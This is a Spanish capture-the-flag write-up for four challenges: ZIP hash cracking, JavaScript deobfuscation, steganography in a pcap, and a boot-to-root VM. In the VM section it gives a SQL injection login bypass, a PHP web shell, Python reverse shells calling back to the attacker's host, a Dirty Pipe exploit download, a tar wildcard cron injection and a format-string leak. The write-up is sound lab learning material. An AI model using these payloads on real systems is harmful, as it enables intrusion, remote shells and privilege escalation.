Reto 1: Papel Moneda 💸
===

En este reto se nos presenta un archivo .zip que contiene lo que en un principio parece un fichero .iso.

![](https://i.imgur.com/pyu68dy.png)

Sin embargo, al abrir este fichero con 7zip o WinRar, encontramos que es otro fichero comprimido.

![](https://i.imgur.com/HRd5jsE.png)

Este segundo fichero no se puede descomprimir, puesto que está protegido por contraseña. En su interior, hay un fichero .txt llamado Flag.txt, que parece contener la flag del reto.

Para encontrar la contraseña del zip se realizaron los pasos que se describen a continuación.

Nota: Si se realiza con winrar, no se observará el archivo .svg necesario para resolver el reto. Se recomienda utilizar 7zip.

## Se obtiene el hash del fichero.

Para esta tarea, utilizaremos el comando zip2john de la siguiente forma:

```
zip2john PapelMoneda.zip
```

o, en su defecto, alguna web como por ejemplo [https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php](https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php), obteniendo así el hash del fichero que le pasaremos a hashcat:

```
$pkzip2$1*2*2*0*1c*10*22378727*0*42*0*1c*2237*58a7*c92104bb82a38ae67bcaeb4167094d1a8ac21183c2d544b22d6f1104*$/pkzip2$
```

## Obtención de la regla para romper el fichero

Tras varios intentos utilizando el bien conocido diccionario *rockyou* para extraer la contraseña del zip, buscamos alguna pista más en el fichero comprimido.

Observando el fichero `papelMoneda.svg` vemos una serie de cuadrados coloreados:

![](https://i.imgur.com/mgbLomM.png)

Cogiendo los valores de los colores en hexadecimal, en el orden en el que aparecen en el fichero SVG, se obtiene la siguiente cadena hexadecimal:
`4C6120636C6176652065733A205F202B20526F636B596F75` haciendo 'From Hex' en la herramienta [Cyberchef](https://gchq.github.io/CyberChef/) (o con cualquier otro traductor hexadecimal - ascii) obtenemos el siguiente mensaje:

`La clave es: _ + RockYou`

Este mensaje parece indicarnos que debemos añadir el caracter `_`delante de las palabras del diccionario *rockyou* para encontrar la contraseña del zip. Por lo tanto, usaremos Hashcat para generar y probar todas las contraseñas con estas características utilizando la siguiente regla: `^_`, que añadiremos a un fichero rules.txt. De esta forma, perpetramos el ataque basado en reglas que probablemente nos de la contraseña del fichero.

## Utilización de hashcat para romper la contraseña del zip

Lo primero que debemos hacer será seleccionar el modo de funcionamiento de hashcat, en este caso tenemos dos posibilidades:

```
  17225 | PKZIP (Mixed Multi-File)                            | Archive
  17210 | PKZIP (Uncompressed)                                | Archive
```

Probando ambos métodos, parece que el correcto es el que se corresponde al modo de funcionamiento `17210`, por lo que el comando final para obtener la flag sería el siguiente:

```
hashcat -m 17210 -r ~/Downloads/rules.txt ~/Downloads/reto.txt /usr/share/wordlists/rockyou.txt
```

![](https://i.imgur.com/QWYHTXg.png)

La contraseña que se obtiene una vez finaliza hashcat es *_princess*, con la cual, finalmente, podemos acceder al archivo.

![](https://i.imgur.com/TYW6l9X.png)


Flag: `_H3LGa_D3-ALV3Ar`

Reto 2: Fiebre del Automovil
===

En este reto tenemos un fichero ZIP llamado FiebreDelAutomovil.zip con una página web. La lógica de la misma se encuentra dentro del fichero `ss.js`:

```javascript
var _0x452a = ["I0f", "#username", "#passwd", "val", "J0Ys" ,"#login", "click"];

(function (_0x9de62c, _0x452a09) {
    var _0x35df2d = function (_0x553bcf) {
        while (--_0x553bcf) {
            _0x9de62c["push"](_0x9de62c["shift"]());
        }
    };
    _0x35df2d(++_0x452a09);
})(_0x452a, 0x155);
var _0x35df = function (_0x9de62c, _0x452a09) {
    _0x9de62c = _0x9de62c - 0x1;
    var _0x35df2d = _0x452a[_0x9de62c];
    return _0x35df2d;
};

var _0x8nv = function (_0x27oc, _0x138gf) {
    return _0x27oc.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);})
};


var _0x19395a = _0x35df;
$(_0x19395a("0x1"))[_0x19395a("0x2")](function () {
    var _0x4b999 = _0x19395a,
     _0x553bcf = $(_0x4b999("0x5"))[_0x4b999("0x6")](),
     _0x4e76e7 = _0x8nv("G3yy");
     $(_0x4b999("0x4"))[_0x4b999("0x6")]()+_0x553bcf == _0x8nv(_0x4b999("0x7")) + _0x8nv(_0x4b999("0x3")) + _0x4e76e7
        ? alert("Correcto!\x20la\x20flag\x20es:\x20usuario+contraseña")
        : alert("\x22Usuario\x20o\x20contraseña\x20incorrectos\x22") & $(_0x4b999("0x4"))[_0x4b999("0x6")]("") & $(_0x4b999("0x5"))[_0x4b999("0x6")]("")
});

```
Tenemos que averiguar el par usuario/contraseña que nos da acceso a la aplicación. Limpiamos el código a mano reemplazando los valores obfuscados por los correspondientes del array y obtenemos el siguiente código:

```javascript

$('#login').click(function () {
     $('#username').val()+$('#passwd').val() == 'W0Lf' + 'V0s'+ 'T3ll';
        ? alert("Correcto! la flag es: usuario+contraseña")
        : alert('"Usuario o contraseña incorrectos"') & $("#username" ).val("") & $("#passwd" ).val("")
});

```

Por lo que la flag es: `W0LfV0sT3ll`

Reto 3: VII - VII
===
En este reto se nos proporciona un fichero `servidor.pcap` que debemos analizar. Para ello, utilizaremos la herramienta Wireshark.

![](https://i.imgur.com/PrUhYxl.png)

A simple vista no parece que haya comunicaciones sospechosas, únicamente algunas transferencias HTTP de algunos ficheros. Para disponer de ellos, exportamos los objetos HTTP que contiene la traza, obteniendo así tres imágenes: mosaico, museo romano y tessera. Esta última parece la más interesante de todas, dado que contiene una especie de QR, aunque no tiene un formato habitual.

![](https://i.imgur.com/SAUqJhU.png)

En este punto, el equipo probó varias opciones: intentar generar un QR con el número hexadecimal, decodificar la imagen con un lector de QR, intentar encontrar alguna tool relacionada con Tessera... pero todo sin éxito. En este punto, decidimos hacer un poco de OSINT y buscar las imágenes mosaico y museo en Google, obteniendo la web del museo nacional de arte romano de Mérida, que es el museo que aparece en la imagen `museo` y que tiene entre su colección el mosaico de los Aurigas, que es el que aparece en la imagen `mosaico`. Utilizando cewl, generamos un diccionario con las palabras contenidas en [la página del museo](https://www.culturaydeporte.gob.es/mnromano/colecciones/nuestras-colecciones/seleccion-piezas/mosaico-aurigas.html) que habla sobre esta pieza:

![](https://i.imgur.com/nnYyFnY.png)

Utilizando la herramienta stegseek con el diccionario utilizado sobre la imagen del QR (`tessera`), obtenemos la flag:

![](https://i.imgur.com/q7R5OiQ.png)

Flag: `art3_ROman0`

Reto 4: Guggenheim's Server 🖥️
===

## Descripción del reto
> En este último reto, debes intentar encontrar 4 nuevas banderas. Para poder realizar el reto correctamente, debes seguir los siguientes pasos: 
> Descarga la máquina virtual desde el siguiente enlace. [https://drive.google.com/file/d/1s2XWsEMntht7JYKWsnNJxodDIsPhR8R1/view](https://drive.google.com/file/d/1s2XWsEMntht7JYKWsnNJxodDIsPhR8R1/view)
Ejecuta la máquina virtual (no debes iniciar sesión en ella).
Obtén la dirección IP de la máquina (utiliza ifconfig, por ejemplo).
Accede en el navegador a DIRECCION_IP_MAQUINA/index.php.
Encuentra las banderas.
Cada bandera, deberá ser entregada en cada una de las partes del reto.
> DIRECCION_IP/index.php


## Configuración inicial
Montamos la VM en VirtualBox, cambiamos la configuración para que el adaptador de red esté en modo puente y podamos acceder directamente a los puertos de la VM.
Accedemos a `http://192.168.1.11/index.php` y tenemos la siguiente web:

![](https://i.imgur.com/mVbcNDd.jpeg)

## Enumeración

Analizando el código fuente de la web, vemos que en la parte de style se referencia una carpeta de imagenes.

![](https://i.imgur.com/OpUyvcQ.png)

al acceder a ella vemos que el directory listing está habilitado, por lo que podemos ver los ficheros que contiene:

![](https://i.imgur.com/KumfChe.png)

Nos descargamos las 3 imagenes, g1.jpg, g2.jpg, index.jpg y revisando con exiftool, vemos que index.jpg contiene un base64:

```
ExifTool Version Number         : 11.50
File Name                       : index.jpg
Directory                       : .
File Size                       : 226 kB
File Modification Date/Time     : 2022:06:24 18:04:54+02:00
File Access Date/Time           : 2022:06:24 18:05:45+02:00
File Inode Change Date/Time     : 2022:06:24 18:05:31+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Comment                         : N2NjMTNlODktOWFhZi00ZGE1LTk4MDktZTc1NTdhN2Q4NmIwIFNvbG8gcGFyYSBtaWVtYnJvcwo=
Image Width                     : 1440
Image Height                    : 960
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1440x960
Megapixels                      : 1.4
```
Obteniendo el decoding en [Cyberchef](https://gchq.github.io/CyberChef/) obtenemos el siguiente mensaje:

```
7cc13e89-9aaf-4da5-9809-e7557a7d86b0 Solo para miembros
```

Esto parece indicar que existe un directorio en la web con dicho nombre que requiere autenticación. Si accedemos directamente a la URL `http://192.168.1.11/7cc13e89-9aaf-4da5-9809-e7557a7d86b0` obtendremos un 404 - Not found como respuesta. Pero sabemos que la tecnología utilizada para implementar la web es PHP, dado que el index tenía esta exstensión. Por tanto, probamos a acceder a `http://192.168.1.11/7cc13e89-9aaf-4da5-9809-e7557a7d86b0.php`, esta vez con éxito.

## Parte 1 - Inicio de sesión SQLi

Accedemos a la web previamente mencionada y vemos el siguiente contenido:

![](https://i.imgur.com/E7sp6Da.png)

Tenemos una página de login, por lo que probamos si es vulnerable a SQLi con la siguiente combinación de usuario y contraseña:

```
usuario: any ' or '1'='1' -- -
password: password 
```
Con esta inyección básica, obtenemos el siguiente resultado:

![](https://i.imgur.com/a5WpWV1.png)

Consiguiendo la primera flag:

`flag{PuppyByJeffK00n$}`

Antes de realizar la inyección a mano se intentó automatizar con la herramienta SQLMap. Para ello se utilizó el siguiente comando
`python3 sqlmap.py -u http://192.168.1.66/db/db.php --data="username=test&password=test" --level=5 --risk=3`

Sin embargo, por cómo están realizadas las redirecciones de la web, no obtuvo ningún resultado satisfactorio. Podrían modificarse los parámetros de SQLMap para intentar bypassear este comportamiento, pero al haber conseguido la inyección a mano, decidimos parar aquí.

## Parte 2 - Shell reversa

En este punto tenemos un panel dónde podemos subir contenido, en teoría archivos de imagen. Para probar si es posible subir ficheros con otro formato, subimos un fichero test.txt, y recargamos la pagina:

![](https://i.imgur.com/fvKd72e.png)

Como podemos ver, el nombre del fichero cambia a un posible hash, pero como el listado de directorios está activo en el servidor, podemos ver cuál es el nombre asignado a nuestros ficheros. Por tanto, vamos a subir una shell en un fichero llamado reverse.php (que nos permita ejecutar comandos) con el siguiente contenido:

```php
<?=`$_GET[1]`?>
```
Como podemos ver, se ha subido correctamente:

![](https://i.imgur.com/mp0uqyU.jpg)

Ahora, pasando como parámetro `1` de la petición GET a la web el comando que queramos ejecutar, podemos lanzar comandos de shell, por ejemplo un `ls` con la forma: `/_S3cr3t_G4ll3ry_F0ld3r_D0_N0t_Fuzz_1t/5cbcbb971b575bf48f61e963000f286a.php?1=ls`, obteniendo así el listado del directorio actual:

![](https://i.imgur.com/O46eQ4w.png)

Ahora, al poder ejecutar comandos, podemos ver el contenido de los directorios que queramos. Listando el directorio padre (`ls ../`), encontramos una carpeta interesante: db.

![](https://i.imgur.com/UMDWtgq.png)

Listando ese directorio (`ls ../db`), vemos el fichero db.php:

![](https://i.imgur.com/BOfNJK5.png)


Visualizamos el contenido lanzando el comando `cat ../db/db.php` con nuestra shell y analizamos el fichero.

![](https://i.imgur.com/0dvl8hs.png)

Si nos fijamos, el fichero aparece cortado. Si inspeccionamos el HTML de la web, podemos analizar el contenido completo del fichero y veremos que hemos obtenido las credenciales para la BBDD, que son:

Usuario: `phpmyadmin`
Password: `uG6#)yUJZE3"Rg&k`

Además, revisando el código podemos comprobar por qué el login inicial era vulnerable a SQL injection, concretamente en la línea:

```
$query = "Select * from users where name='$usr' and password='password' limit 1";
```

Al usuario y la contraseña no les hemos encontrado utilidad, pero es algo interesante de mencionar y que en este punto no podemos dejar pasar por alto.

Para hacer más cómodos los siguientes pasos, vamos a lanzar una shell reversa hacia nuestra máquina. Para ello, utilizaremos el siguiente comando a través de nuestra shell:

`192.168.1.11/_S3cr3t_G4ll3ry_F0ld3r_D0_N0t_Fuzz_1t/5cbcbb971b575bf48f61e963000f286a.php?1=python3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22192%2E168%2E1%2E10%22%2C1234%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27`

Y en nuestra máquina local ejecutaremos el comando:

`netcat -lvnp 1234`

Obteniendo así una shell reversa:

![](https://i.imgur.com/WfuxnmE.png)

La hacemos un poco más funcional con el comando `python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](https://i.imgur.com/xbNslGb.png)

## Parte 3 - Escalado de privilegios

Ahora que podemos lanzar comandos en la máquina, vemos que somos el usuario www-data. Por lo tanto, muy probablemente necesitaremos escalar privilegios para obtener las siguientes flags. Para automatizar este proceso, nos descargamos LinPEAS del repositorio de Github y lo ejecutamos, redirigiendo la salida a un fichero para poder leerla más cómodamente después. Lo haremos mediante los siguientes comandos:

```http
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220619/linpeas.sh

./linpeas.sh > scalate.log
```

Una vez finalizado, accedemos a scalate.log y vemos que es la máquina es potencialmente vulnerable al CVE-2022-0847, que podríamos usar para escalar a root directamente:

![](https://i.imgur.com/ubeDPJw.png)

Ahora buscamos algún exploit para este CVE. Encontramos el siguiente enlace [https://github.com/febinrev/dirtypipez-exploit/blob/main/dirtypipez.c](https://github.com/febinrev/dirtypipez-exploit/blob/main/dirtypipez.c) que nos proporciona un exploit para la vulnerabilidad, el cual compilaremos y ejecutaremos. Descargaremos el fichero del repositorio con 

`wget https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c`


![](https://i.imgur.com/BuSQAIF.png)

Y lo compilamos y ejecutamos:

![](https://i.imgur.com/IR4Wq3R.png)
![](https://i.imgur.com/rWl2ijh.png)

Por desgracia, no hemos conseguido explotar la vulnerabilidad. Vamos a ejecutar [pspy64](https://github.com/DominicBreuker/pspy) para ver si encontramos algún proceso sospechoso. Durante la ejecución, nos damos cuenta de que hay un procedimiento que se encarga de hacer un backup de la página web cada cierto tiempo:

![](https://i.imgur.com/DIeigY5.png)

Así que vamos a ver si podemos editarlo. Moviéndonos a /var y listando este directorio nos encontramos la flag de nuestro usuario (`www-data`):

![](https://i.imgur.com/jxmdidt.png)

`flag{PinTX0$}`

Ahora continuamos con nuestra escalada de privilegios. Revisando el comando utilizado para hacer el backup, vemos que este cronjob es vulnerable al utilizar el wildcard * en su ejecución, lo que nos permitirá crear una shell reversa impersonando al usuario que ejecute el cronjob, en este caso `user`.

![](https://i.imgur.com/2rjAWub.png)

Gracias a la web [GTFObins](https://gtfobins.github.io/gtfobins/tar/#limited-suid) podemos encontrar un modo de explotar este comportamiento:

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

El problema aquí es que debemos crear ficheros cuyo nombre se corresponda con los parámetros que queremos añadir al comando tar, y el caracter `/` no está permitido como nombre de fichero. Para saltarnos esta restricción, creamos un script llamado `paco.sh` (nos gustan los nombres originales) que en su interior contenga el comando para lanzar una shell reversa hacia nuestra máquina:

`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",1235));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")')`

Creamos también los ficheros que nos permiten explotar la vulnerabilidad, cuyos nombres sean `--checkpoint=1` y `--checkpoint-action=exec='sh paco.sh'` respectivamente. De esta forma conseguiremos una reverse shell, impersonando al usuario `user` cuando se ejecute el cronjob de nuevo:

![](https://i.imgur.com/0DgP6kz.png)

Recibiendo la conexión en nuestra máquina host:

![](https://i.imgur.com/Zium5LA.png)

Ahora, si nos vamos al /home del usuario, podemos obtener la flag de user:

![](https://i.imgur.com/GNCYMFI.png)

`flag{TxAp3l4S}`

Haciendo ls, vemos un fichero interesante creado por root en el /home del user, el fichero test:

![](https://i.imgur.com/EFk9WSj.png)

Ejecutando el comando `file` vemos que se trata de un binario ejecutable de 64 bits.

![](https://i.imgur.com/fO8YdRa.png)

Ejecutando el comando `strings` sobre el ejecutable, obtenemos la última flag:

![](https://i.imgur.com/9bzKguk.png)

`flag{*Gugg3nh3im-BilbA0*}`


## Parte 4 (Bonus) - Reversing del binario con Ghidra y explotación

Habiendo obtenido todas las flags, vamos a reversear el binario para ver si hubiésemos podido obtener la flag con métodos más estrictos. Para ello, descargamos el fichero a una máquina virtual Kali en la que tenemos instalado el software [Ghidra](https://ghidra-sre.org/), ideal para tareas de reversing. Una vez abierto y analizado el fichero, observamos el siguiente código fuente:

![](https://i.imgur.com/v3zod0G.png)

Como podemos ver, se leen 40 bytes de la entrada estándar y se guardan en la variable local_38, para posteriormente imprimirlo a través del primer argumento de `printf`, en vez del segundo o sucesivos. Esta práctica supone una vulnerabilidad, ya que el string del usuario podría contener strings de formateo (`%x`, `%s`...) como se demostrará más adelante. Primero ejecutamos el fichero, comprobando la funcionalidad básica:

![](https://i.imgur.com/ebJIQiL.png)

¿Qué pasa si incluimos caracteres de formateo de strings, por ejemplo `%s%s%s%s%s%s%s%s`?

![](https://i.imgur.com/fWfe3KQ.png)

Como en el código original la llamada a printf no tiene más argumentos, estamos recorriendo el stack imprimiendo diferentes valores existentes en memoria, por lo que podemos obtener la flag aprovechando dicha vulnerabilidad.

La versión no vulnerable de la misma función sería algo similar a:
```c 
printf("%s", string_del_usuario);
```

Con esto finalizamos los cuatro retos que componen la máquina virtual Guggenheim's Server.